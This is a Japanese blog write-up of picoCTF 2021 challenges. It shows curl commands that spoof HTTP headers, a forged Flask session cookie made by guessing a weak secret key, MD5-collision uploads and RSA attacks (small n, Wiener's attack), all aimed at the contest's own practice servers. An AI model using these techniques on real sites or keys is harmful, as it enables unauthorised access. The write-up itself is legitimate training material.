---
title: "picoCTF 2021 Writeup"
date: 2021-04-10T19:00:00+09:00
lastmod: 2021-04-10T19:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF", "Reviewed"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpicoctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。)

URL: [https://play.picoctf.org/practice](https://play.picoctf.org/practice)


<table><tr><td>
お詫び：

どうやら、Winnerが決まるまでWriteupはPublishしてはいけなかったみたいですね。正直、知らなくてフライングしました。スミマセン。。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_announcement1.png" alt="picoctf_2021_announcement1.png"><br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_announcement2.png" alt="picoctf_2021_announcement2.png">
</td></tr></table>

<br />
1820ポイントで、最終順位は431位でした。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_Score.png" alt="picoctf_2021_Score.png">

<br />

ここ3ヶ月間、プライベートの方が忙しくて全くCTFできていなかった割には、まぁまぁできた方かなと思います。

<br />

以下が解いたチャレンジの状況です。Binaryがほとんど手付かずでした。

[Web] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_web.png" alt="picoctf_2021_web.png">

<br />

[Crypto] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_crypto1.png" alt="picoctf_2021_crypto1.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_crypto2.png" alt="picoctf_2021_crypto2.png">

<br />

[Reverse] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_rev.png" alt="picoctf_2021_rev.png">

<br />

[Forensics] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_forensic.png" alt="picoctf_2021_forensic.png">

<br />

[General Skills] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_general.png" alt="picoctf_2021_general.png">

<br />

[Binary] <br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_binary.png" alt="picoctf_2021_binary.png">





<br /><br />
## [Web]: Ancient History (10 points)
- - -
### Challenge
> (チャレンジ文、メモし忘れました。後日更新します。)
<br /><br />
Hint1: What kind of information can JavaScript modify?
<br /><br />
Hint2: If you want to do this the un-fun way, the obfuscation is pretty lazy.

<br />
### Solution
タイトルとヒントから、JavascriptでHistoryを残している模様。(どうやってやっているかは知らないです)

<br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_ancient_history.png" alt="picoctf_2021_ancient_history.png">

Javascriptを含んでいるHTMLソースをテキストファイルにしておいて、以下をやってフラグ部分を取り出しました。

<pre>
$ cat ancient_history.txt | cut -d: -f2 | cut -c -15 | grep index | cut -d? -f2 | cut -c -1 | tr -d "\n" ; echo
</pre>

<br />

Flag: `picoCTF{th4ts_k1nd4_n34t_bb660d55}`




<br /><br />
<br /><br />
## [Web]: GET aHEAD (20 points)
- - -
### Challenge
> Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:21939/


<br />
### Solution
HEADメソッドでアクセス。

<pre>
$ curl -v -X HEAD http://mercury.picoctf.net:21939/
Warning: Setting custom HTTP method to HEAD with -X/--request may not work the
Warning: way you want. Consider using -I/--head instead.
*   Trying 18.189.209.142...
* TCP_NODELAY set
* Connected to mercury.picoctf.net (18.189.209.142) port 21939 (#0)
> HEAD / HTTP/1.1
> Host: mercury.picoctf.net:21939
> User-Agent: curl/7.64.1
> Accept: */*
>
< HTTP/1.1 200 OK
< flag: picoCTF{r3j3ct_th3_du4l1ty_6ef27873}
< Content-type: text/html; charset=UTF-8
* no chunk, no close, no size. Assume close to signal end
<
* Closing connection 0
</pre>

<br />

Flag: `picoCTF{r3j3ct_th3_du4l1ty_6ef27873}`



<br /><br />
<br /><br />
## [Web]: Cookies (40 points)
- - -
### Challenge
> Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:17781/

<br />
### Solution
Burpを使って解きました。

GET /check をしているHTTP RequestをRepeaterに入れて、Cookie: name=XX のところの数字を変えてSendしていったら、18のところでフラグが取れました。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_cookies.png" alt="picoctf_2021_cookies.png">

<br />

Flag: `picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}`


<br /><br />
<br /><br />
## [Web]: Scavenger Hunt (50 points)
- - -
### Challenge
> There is some interesting information hidden around this site http://mercury.picoctf.net:44070/. Can you find it?
<br /><br />
Hint: You should have enough hints to find the files, don't run a brute forcer.


<br />
### Solution
まずは、View Sourceでcssとかのファイルを見ていくと、part2まで見つかります。

<pre>
Here's the first part of the flag: picoCTF{t
</pre>
<pre>
/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
</pre>

<br />

part3は、robots.txtの中にあります。次のヒントも含まれます。
<pre>
User-agent: *
Disallow: /index.html
# Part 3: t_0f_pl4c
# I think this is an apache server... can you Access the next flag?
</pre>

<br />
part4は、.htaccessの中にあります。次のヒントも含まれます。
<pre>
# Part 4: 3s_2_lO0k
# I love making websites on my Mac, I can Store a lot of information there.
</pre>

<br />
part5は、.DS_Storeの中にあります。
<pre>
Congrats! You completed the scavenger hunt. Part 5: _7a46d25d}
</pre>


<br />

Flag: `picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_7a46d25d}`



<br /><br />
<br /><br />
## [Web]: Who are you? (60 points)
- - -
### Challenge
> Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:1270/
<br /><br />
Hint: It ain't much, but it's an RFC https://tools.ietf.org/html/rfc2616

<br />
### Solution
表示されるメッセージを元に、ヘッダを追加していくチャレンジです。

> I don't trust users visiting from another site.

以下のヘッダを追加します。
<pre>
User-Agent: PicoBrowser
</pre>

<br />

> I don't trust users visiting from another site.

以下のヘッダを追加します。
<pre>
Referer:http://mercury.picoctf.net:1270/
</pre>

<br />

> Sorry, this site only worked in 2018.

以下のヘッダを追加します。
<pre>
Date: Mon, 01 Jan 2018 00:00:00 GMT
</pre>

<br />

> I don't trust users who can be tracked.

以下のヘッダを追加します。DNTは、Do Not Trackの略ですね。
<pre>
DNT: 1
</pre>

<br />

> This website is only for people from Sweden.

適当にスウェーデンのIPを調べて、以下のヘッダを追加します。
<pre>
X-Forwarded-For: 94.234.37.10
</pre>

<br />

> You're in Sweden but you don't speak Swedish?

"accept-language sweden"でググったら、sv-SEというのが正解らしいです。以下のヘッダを追加します。
<pre>
Accept-Language: sv-SE
</pre>

<br />

最終的に、curlコマンドは以下のようになりました。

<pre>
curl -v -H "User-Agent: PicoBrowser" -H "Referer:http://mercury.picoctf.net:1270/" -H "Date: Mon, 01 Jan 2018 00:00:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 94.234.37.10" -H "Accept-Language: sv-SE" http://mercury.picoctf.net:1270/
</pre>

<br />

Flag: `picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_f56f58a5}`



<br /><br />
<br /><br />
## [Web]: Some Assembly Required 1 (70 points)
- - -
### Challenge
> http://mercury.picoctf.net:55336/index.html

<br />
### Solution
Developer toolでJavascriptの中を適当にstepしていったら、フラグが出てきました。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_web_asm.png" alt="picoctf_2021_web_asm.png">

<br />

Flag: `picoCTF{51e513c498950a515b1aab5e941b2615}`



<br /><br />
<br /><br />
## [Web]: It is my Birthday (100 points)
- - -
### Challenge
> I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:11590/
<br /><br />
Hint1: Look at the category of this problem.
<br /><br />
Hint2: How may a PHP site check the rules in the description?

<br />
### Solution
md5の一致する2つの異なるPDFをSubmitしたらよさそうな感じです。

<br />
ネットで見つけた画像をアップしてみたところ、`File too large!` と出たので、なるべく小さいファイルを探すことにしました。

<br />
見つけたのがこれ。4kバイトのelfファイルです。

https://www.mscs.dal.ca/~selinger/md5collision/

<pre>
-rw-r--r--@  1 xxxx  staff    4072 Mar 29 12:20 erase
-rw-r--r--@  1 xxxx  staff    4072 Mar 29 12:19 hello
</pre>

<br />

拡張子に.pdfを付けてアップしたら、index.phpが表示されて、その中にフラグがありました。

```PHP
<?php

if (isset($_POST["submit"])) {
    $type1 = $_FILES["file1"]["type"];
    $type2 = $_FILES["file2"]["type"];
    $size1 = $_FILES["file1"]["size"];
    $size2 = $_FILES["file2"]["size"];
    $SIZE_LIMIT = 18 * 1024;

    if (($size1 < $SIZE_LIMIT) && ($size2 < $SIZE_LIMIT)) {
        if (($type1 == "application/pdf") && ($type2 == "application/pdf")) {
            $contents1 = file_get_contents($_FILES["file1"]["tmp_name"]);
            $contents2 = file_get_contents($_FILES["file2"]["tmp_name"]);

            if ($contents1 != $contents2) {
                if (md5_file($_FILES["file1"]["tmp_name"]) == md5_file($_FILES["file2"]["tmp_name"])) {
                    highlight_file("index.php");
                    die();
                } else {
                    echo "MD5 hashes do not match!";
                    die();
                }
            } else {
                echo "Files are not different!";
                die();
            }
        } else {
            echo "Not a PDF!";
            die();
        }
    } else {
        echo "File too large!";
        die();
    }
}

// FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_3d3e4c57}

?>
```

<br />

Flag: `picoCTF{c0ngr4ts_u_r_1nv1t3d_3d3e4c57}`




<br /><br />
<br /><br />
## [Web]: Most Cookies (150 points)
- - -
### Challenge
> Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:65344/
<br /><br />
Hint1: How secure is a flask cookie?

Attachment:

- server.py

中身

```Python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()

```


<br />
### Solution
コードを読み解くと、sessionクッキーに `"{'very_auth': 'admin'}"` をセットしてあげればいい感じです。

secret keyは、いくつかあるcookie名のどれかひとつなので、全パターン試す方針でいきました。

エンコードには、以下のツールを使いました。<br />
https://noraj.github.io/flask-session-cookie-manager/

以下をやったときに、フラグが取れました。
<pre>
curl -v -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YGMnjQ.YRj4FLiReh9G5jImp_z4_ksNXFY" http://mercury.picoctf.net:65344/display
</pre>

<br />

Flag: `picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}`



<br /><br />
<br /><br />
## [Crypto]: Mind your Ps and Qs (20 points)
- - -
### Challenge
> In RSA, a small e value can be problematic, but what about N? Can you decrypt this? values
<br /><br />
Values:<br />
Decrypt my super sick RSA:<br />
c: 62324783949134119159408816513334912534343517300880137691662780895409992760262021<br />
n: 1280678415822214057864524798453297819181910621573945477544758171055968245116423923<br />
e: 65537


<br />
### Solution
<pre>
$ RsaCtfTool.py -n 1280678415822214057864524798453297819181910621573945477544758171055968245116423923 -e 65537 --uncipher 62324783949134119159408816513334912534343517300880137691662780895409992760262021
[+] Clear text : b'\x00picoCTF{sma11_N_n0_g0od_05012767}'
</pre>

<br />

Flag: `picoCTF{sma11_N_n0_g0od_05012767}`



<br /><br />
<br /><br />
## [Crypto]: Mini RSA (70 points)
- - -
### Challenge
> What happens if you have a small exponent? There is a twist though, we padded the plaintext so that (M ** e) is just barely larger than N. Let's decrypt this: ciphertext


<br />
### Solution
これも RsaCtfTool.py で解けました。

<br />

Flag: `picoCTF{e_sh0u1d_b3_lArg3r_6e2e6bda}`


<br /><br />
<br /><br />
## [Crypto]: Dachshund Attacks (80 points)
- - -
### Challenge
> What if d is too small? Connect with nc mercury.picoctf.net 36463.
<br /><br />
Hint1: What do you think about my pet? dachshund.jpg

<pre>
$ nc mercury.picoctf.net 36463
Welcome to my RSA challenge!
e: 51537241764217253336345243311947713349968154199629189420157791436090484980202646181796053644360119963893952439517397387647017579509149211949359554937724767469698141776524467766769342433272225705039609292625524425456728627405240349489519425394684117442350460638749566715146334995284556849251272359311384375471
n: 97898927176062501432192701500578400140380522846944393428134289284776849545743699261607906303291030297744139365338020081188743685611075849612951429157738895287000243531804108300250808832527224707218317655911899492161762533016486603095747039144712499867199366218631152052998452387165136335660726462544926693081
c: 67457181885150124304023419649124675286255007819125635338936395085652015523669117126061198023228949491008135664753666447629036803602744839291943812720732475661169267477075392733551150940443733190801167395263239701617897840753295515554415410443666195318993811717090316627235081075422679422940861478484402552155
</pre>

<br />
### Solution
ググってみたら、dが小さいRSAのやつは、Wiener's attackというらしいです。
> 英語から翻訳-暗号学者のMichael J. Wienerにちなんで名付けられたウィーナーの攻撃は、RSAに対する一種の暗号攻撃です。攻撃は、継続分数法を使用して、dが小さいときに秘密鍵dを公開します。


以下のツールを使わせてもらいました。<br />
https://github.com/orisano/owiener

<br />
- dachshund_solve.py
```Python
import owiener

e = 51537241764217253336345243311947713349968154199629189420157791436090484980202646181796053644360119963893952439517397387647017579509149211949359554937724767469698141776524467766769342433272225705039609292625524425456728627405240349489519425394684117442350460638749566715146334995284556849251272359311384375471
n = 97898927176062501432192701500578400140380522846944393428134289284776849545743699261607906303291030297744139365338020081188743685611075849612951429157738895287000243531804108300250808832527224707218317655911899492161762533016486603095747039144712499867199366218631152052998452387165136335660726462544926693081
c = 67457181885150124304023419649124675286255007819125635338936395085652015523669117126061198023228949491008135664753666447629036803602744839291943812720732475661169267477075392733551150940443733190801167395263239701617897840753295515554415410443666195318993811717090316627235081075422679422940861478484402552155
d = owiener.attack(e, n)

if d is None:
    print("Failed")
else:
    hex_string = hex(pow(c,d,n))
    hex_string = hex_string[2::] # To remove "0x"
    print(bytearray.fromhex(hex_string).decode())
```

<pre>
$ python dachshund_solve.py 
picoCTF{proving_wiener_2635457}
</pre>


<br />

Flag: `picoCTF{proving_wiener_2635457}`




<br /><br />
<br /><br />
## [Crypt]: Pixelated (200 points)
- - -
### Challenge
> I have these 2 images, can you make a flag out of them? scrambled1.png scrambled2.png
<br /><br />
Hint1: https://en.wikipedia.org/wiki/Visual_cryptography
<br /><br />
Hint2: Think of different ways you can "stack" images


<br />
### Solution
ImageMagickのcompositeをいろいろ試していったら、addでフラグが出ました。

<pre>
 $ composite -compose plus scrambled1.png scrambled2.png out.png
 $ composite -compose over scrambled1.png scrambled2.png out.png
 $ composite -compose multiply scrambled1.png scrambled2.png out.png
 $ composite -compose screen scrambled1.png scrambled2.png out.png
 $ composite -compose add scrambled1.png scrambled2.png out.png
</pre>

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_Pixelated.png" alt="picoctf_2021_Pixelated.png">

<br />

Flag: `picoCTF{1b867c3e}`



<br /><br />
<br /><br />
## [Reverse]: Transformation (20 points)
- - -
### Challenge
> I wonder what this really is... enc ''.join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])
<br /><br />
Hint: You may find some decoders online


<br />
### Solution
"unicode decoder"でググってヒットした最初のやつ（以下）を使わせてもらいました。

https://r12a.github.io/app-conversion/

<pre>
7069 636F 4354 467B 3136 5F62 6974 735F 696E 7374 3334 645F 6F66 5F38 5F30 3463 3037 3630 647D
</pre>

<br />

Flag: `picoCTF{16_bits_inst34d_of_8_04c0760d}`



<br /><br />
<br /><br />
## [Reverse]: keygenme-py (30 points)
- - -
### Challenge
> keygenme-trial.py

中身

```Python
#============================================================================#
#============================ARCANE CALCULATOR===============================#
#============================================================================#

import hashlib
from cryptography.fernet import Fernet
import base64



# GLOBALS --v
arcane_loop_trial = True
jump_into_full = False
full_version_code = ""

username_trial = "PRITCHARD"
bUsername_trial = b"PRITCHARD"

key_part_static1_trial = "picoCTF{1n_7h3_|<3y_of_"
key_part_dynamic1_trial = "xxxxxxxx"
key_part_static2_trial = "}"
key_full_template_trial = key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial

star_db_trial = {
  "Alpha Centauri": 4.38,
  "Barnard's Star": 5.95,
  "Luhman 16": 6.57,
  "WISE 0855-0714": 7.17,
  "Wolf 359": 7.78,
  "Lalande 21185": 8.29,
  "UV Ceti": 8.58,
  "Sirius": 8.59,
  "Ross 154": 9.69,
  "Yin Sector CL-Y d127": 9.86,
  "Duamta": 9.88,
  "Ross 248": 10.37,
  "WISE 1506+7027": 10.52,
  "Epsilon Eridani": 10.52,
  "Lacaille 9352": 10.69,
  "Ross 128": 10.94,
  "EZ Aquarii": 11.10,
  "61 Cygni": 11.37,
  "Procyon": 11.41,
  "Struve 2398": 11.64,
  "Groombridge 34": 11.73,
  "Epsilon Indi": 11.80,
  "SPF-LF 1": 11.82,
  "Tau Ceti": 11.94,
  "YZ Ceti": 12.07,
  "WISE 0350-5658": 12.09,
  "Luyten's Star": 12.39,
  "Teegarden's Star": 12.43,
  "Kapteyn's Star": 12.76,
  "Talta": 12.83,
  "Lacaille 8760": 12.88
}


def intro_trial():
    print("\n===============================================\n\
Welcome to the Arcane Calculator, " + username_trial + "!\n")    
    print("This is the trial version of Arcane Calculator.")
    print("The full version may be purchased in person near\n\
the galactic center of the Milky Way galaxy. \n\
Available while supplies last!\n\
=====================================================\n\n")


def menu_trial():
    print("___Arcane Calculator___\n\n\
Menu:\n\
(a) Estimate Astral Projection Mana Burn\n\
(b) [LOCKED] Estimate Astral Slingshot Approach Vector\n\
(c) Enter License Key\n\
(d) Exit Arcane Calculator")

    choice = input("What would you like to do, "+ username_trial +" (a/b/c/d)? ")
    
    if not validate_choice(choice):
        print("\n\nInvalid choice!\n\n")
        return
    
    if choice == "a":
        estimate_burn()
    elif choice == "b":
        locked_estimate_vector()
    elif choice == "c":
        enter_license()
    elif choice == "d":
        global arcane_loop_trial
        arcane_loop_trial = False
        print("Bye!")
    else:
        print("That choice is not valid. Please enter a single, valid \
lowercase letter choice (a/b/c/d).")


def validate_choice(menu_choice):
    if menu_choice == "a" or \
       menu_choice == "b" or \
       menu_choice == "c" or \
       menu_choice == "d":
        return True
    else:
        return False


def estimate_burn():
  print("\n\nSOL is detected as your nearest star.")
  target_system = input("To which system do you want to travel? ")

  if target_system in star_db_trial:
      ly = star_db_trial[target_system]
      mana_cost_low = ly**2
      mana_cost_high = ly**3
      print("\n"+ target_system +" will cost between "+ str(mana_cost_low) \
+" and "+ str(mana_cost_high) +" stone(s) to project to\n\n")
  else:
      # TODO : could add option to list known stars
      print("\nStar not found.\n\n")


def locked_estimate_vector():
    print("\n\nYou must buy the full version of this software to use this \
feature!\n\n")


def enter_license():
    user_key = input("\nEnter your license key: ")
    user_key = user_key.strip()

    global bUsername_trial
    
    if check_key(user_key, bUsername_trial):
        decrypt_full_version(user_key)
    else:
        print("\nKey is NOT VALID. Check your data entry.\n\n")


def check_key(key, username_trial):

    global key_full_template_trial

    if len(key) != len(key_full_template_trial):
        return False
    else:
        # Check static base key part --v
        i = 0
        for c in key_part_static1_trial:
            if key[i] != c:
                return False

            i += 1

        # TODO : test performance on toolbox container
        # Check dynamic part --v
        if key[i] != hashlib.sha256(username_trial).hexdigest()[4]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[5]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[3]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[6]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[2]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[7]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[1]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[8]:
            return False



        return True


def decrypt_full_version(key_str):

    key_base64 = base64.b64encode(key_str.encode())
    f = Fernet(key_base64)

    try:
        with open("keygenme.py", "w") as fout:
          global full_version
          global full_version_code
          full_version_code = f.decrypt(full_version)
          fout.write(full_version_code.decode())
          global arcane_loop_trial
          arcane_loop_trial = False
          global jump_into_full
          jump_into_full = True
          print("\nFull version written to 'keygenme.py'.\n\n"+ \
                 "Exiting trial version...")
    except FileExistsError:
    	sys.stderr.write("Full version of keygenme NOT written to disk, "+ \
	                  "ERROR: 'keygenme.py' file already exists.\n\n"+ \
			  "ADVICE: If this existing file is not valid, "+ \
			  "you may try deleting it and entering the "+ \
			  "license key again. Good luck")

def ui_flow():
    intro_trial()
    while arcane_loop_trial:
        menu_trial()



# Encrypted blob of full version
full_version = \
b"""
gAAAAABgT_nvf4P0-CFwlBsPrO8lFGYdOMPOsW49NMCVP4OQm4TqUiwWH6wolWNozf6wSudqEnLxlV6_tpyRrEDHQjBf05wp3N8eVOlkGtbYvQ1j3rJp5A-u68f04WfV-Tbx87qMXkicUYywezrlklzxOtOGeqatlaT9uQXVHu9FyZbYmcKGrpQ5gnGc-u278DYd2vmYgo8Y4gsf0DsRy3R3OhpI9oAYBtoThP6A2kwvggWAYUTNv6VQ3mcpwgwGqJP6tro8BHkGJVW2xQMiptJfXWdANIAQOoL9Xse3spqlSmnaZzTZ2nGpWtzPsGXXbBo2YRV1tRm4HNeS4VpSnHPVd5nNBe7hTckqs_ye1WkG58z1ldo7fvLDRudVMrjBYSsQHd64XMaq5KFZeKWtm0F6r5DYK5d5UFhZzZi8F7PIQZ481lgTb4QxBu0HvsMcjk9r10aeKHzMxYDEpq8o9xZXlBhYMB9N6919y2Deuk2-VICbc2RX5NMzBjIfqnwJvWG7w8ystaiN-BxATHHcvSuV6_3tsGqEbJi7wILo2sMBiAa_a3pLDnIovXhG3dqbxR0Ay9fQFSJvcUqqbyXcK5MPs52_iZWJ2wD27ac6EQP911pHwaE6N_7p3u8zHOzMk4LDSZJhADeotihRJYXuAw3laDfOVWo1H2JoLGfuU6--4PcJAqQz1ZRTXWEkP6hcd2UtXKZVF8kzGTRyl5KSbMoU2ZJGSXrVZMpjdFE5WON_ZBa-TAdw537NZvr-bVINw8oPmb39n3VYRQFB_bkuUHcgHqVaexTIrAVL10jJdyIQtVRaZdxWkmdhNNWgkhSXozz9oatq_PYVlb_6aiWD8co4l019-H8dhrZHqMUR06JryR3aDcV85eFKSQKWfs5gS67vJYfPj3V7SJVUtS30jGEjZQO8mmBnncBOX927pBxZKtwn111m9Ryr-Lwack7UWQj4JFIDgHwXghN7ScGQDc3BNQImfutCuVFf9MVOCb7QZru0icd7o3eEztFDPHOZQIKSDBq7zfmZBgppEFZjouAUO4d97hkcnSGf6nRM2oqhwt_9N5h_e3SntRNJGoPfHrjsWutGZO-2kaw6kFIVsL0QBdMDS2V8oFFCpMiNoWS1OvrILvzT-UGtQKtfmC0H-zR1CL3PQGfPbcgW08EmkuSPrZk-bKTucvz6r_9PxQPMznyhpm_5f1MhYt_eKkwpkRS9zChuNtb3vP2Qp3M5CUdWpxA3dNmrarihWka94RCuUDftROcBIWpNUrWci-fkDCzeYHwFs_qH3DK85dKpmQVnmHrrRG2rH9Y1jW2jpqmEHiZKjc6tQa2kmRVR9vDvaygFjDAzGk7b2h7nLFHCKPvJnvkw-yvSIL8GVHVTWhe2PhK983qu2RQIlL3R-27Xzx_pz_0OehnosqeZkY19T1Jzri2BcL9HYB_qAdniXONU36zj9ZiUs_Ffpq4OgiVw2-bBLIDEtpN2xSj2P7-An_Xjtbgr0ukMdEUjFLV4yScjaqDBM7kM1rE2l4fFPY0pEMy3aasIAJRL9mDS04jLDCsZn_BxxIlOpnVBvHZld_rRyRWtbN3UESj6jl2pHIxzgvMg9E8Eyt8XT7bgRfimMDrocMahrGhE018t3xTNDtNHgnoaD2t4DyqQr1pr6TcMKRxNqqXy3dEYvKDVhBmzFc00YKkT6bp0ufwpzlknFnEEmHh6QAoxdM5uD_3QEm1X67gtwoOXFtY3TSGJ9CzfWsOeQ_BjxyWJkm4W6b3SbnlJ68hsTXUk6Cc3uzoczgwCeyb6uSw5O9cHT-s5KTpHlnISkB0SYs4pZMHcQ-gq3URPYTeGP11KLfWCMuznCosYc3R7jriReKKOjFD2CU2Fc-i_CmlkRJ4tqDhKZFx3UhBCUQY4JVAOS8RQTb1T9qW-mNe8JcDEpPirqNMI_wL3EFWKyd8jQGM38mRjkq2p2jf9HRNVvmpyFNWxiOP8jsG3RvtiGS3Nv58D417EgRUCG_FEQiHRKmxjuUIAmpGEioln2Yf3sGYoBfvhwlZinTdpiVoUwjRAZdRXMvoYhRQnIT7ykQlTax64DS4RxHeFjaO6FyWMR3rDkRQSvMsUTzmFGVST564CfvSUHKPIz91SNcgbQoR5Y3-4GS50qX87sBu8ow-Z6zquzMDavkpBJzxrB1NX0Tez1SREt4ViK3Hi5Jvr1r8uKTDgjH62v5HBRZlqlMOQBXPBKAAMPUOqqsqKbil6NOiOADezhcYfc4Vy3N11AfL3mx2AIHpLfdtYcUzsuImPpAu6V75_zD5GdzGdb-N3uYPJrkKmQOoK61HsJQjVjgluoNHavR13fJ0FQWYJpEyn4P1Tuhkv4pgtYMtiXHwC6804DdsTMdgFrTR3K0E-xwDq0E68pkcebW7hZAuXE3Qhxviyb6BHx5E_recW3q2Od7_J_CSiECgf_0ykLuKZM4aQBLp7UM9aafK109Z6rwGDdsJ3_C5u0RIZ6gh5d_lRtWroUzsTryuM-XqRe_xuIbLzYBeAqSjovbKFIeev3vJ3KdNRVO65kBJUaOIGn7uv6Qv2am4Hfo-wu86J2wKyMaAUsL0TEyKKInh03rg1IQY84xdAEeqVSStn3fU5GdnxYrt-ByhvTNAoXhGGKPjzhzLdvgBB07Or9OtjvjyDByD8KFpolp1_TiMnDW6Rp66HQlqFgqgrEA0Ix3-nkU_R2yC8xR2QEvD2A9JxKKwc03NtwmlKi9NlslYKLS0g7lu3CombAx7AqAMIF__kM8czRVV9Np-IvDp2CZEArvryF_Oo0CKszZy2ngXZbSD1bobYDa6168yUNGyaL-nbDiB28QL1wiDjLL6vF-dYU2Q9-cVuE11bSZOzbARbr-oaMHC6QACNbs6vpF6Tq9tOJdEbUfAwXt-BEk3KlAW7mcYgpFvADD6ZdefN99lCoAJSljgy243CMEfw8WGfNUMh8uHKsmcHie089aiJLlzEs5o0MacV43ttbgBQ0rMD7e5KHf56dqDO0k15E9UsYsiniGbs8sNPRL-SQzpZqWBd4z2gEXc9_l7xMv_GpXBz4Dj7OJKu7TzD5Vvmd54wqWcMPo7MMIpMY6xyUIZgK9IvUc_dRkV9ze3FfaJi656TBo4Fw1MgURqyRx8kCUsMCqGJgftryPMA0iA0ha3_9dEIZKyJwt51I1JltO6GUQTMYa9nvmcbFyxH3XIgjjT2T8X1vrPZqYDJ0BMIV1OlweD_V69NjykDxa879r-SvSByONyeTrqe_yDfBKxjVJPPmSy9U9uIN8mjuPOjbHnnG_vjsACp22slbyv5Qc75znhhwQe7KuxCIuf3WfZi_WDMXxWKXaaM-Q4o8qM5B3Ak2lC1VyalFvUkLA-aUTrj1RgQ6FziAA14l9cQQu4hJJ0mOBdmcAd_cpbCkD2ADlA-IxYcIXflwDWf-WUO8b-QzuHie3g0V6dzlCN9B56w6XlwhkeTS4OQdmtIBVZvhqBXJpXzmHBLlHwirF4COCWSn5w_Q7D9z1kq0RjMyzqrq36UTVGjKfWxMKVvnd1RQkn3PsddwJG62Dfaty3td43RyTUvsGwrTglZWe7v6229eYxDXwmgbtJ_eWSjdcyr9i38diyOLbDzs6xvdLL4bjR5WqB4YBcNFlXMvnyJxt4hiyDvZriJpmtsa7O58-ReW4KkbDo1RjrL20GeFfiQELW_V-11gvPoyLIigmTt4oluCleUDLuZ0gkhRLY9ve9f8kmQDsMLWSM2S-0xq4Q3QQZrOAHYEme3o5iROA2EU5lYwQGXXJIiVsIYzQWC2ULrmqJ67ceCwUgPzdCT8qnnhTETGwGDxFlLbJRiiqpNQ3WeGgEHFSN2bLQypC5CZwowIg==
"""



# Enter main loop
ui_flow()

if jump_into_full:
    exec(full_version_code)
```

<br />
### Solution
フラグの一部がdynamicということで xxxxxxxx になってます。それ以外の部分はstaticで固定です。

check_key()関数の中で、正解のフラグと比較をしているので、printするなりして文字列を取得するだけです。

<br />

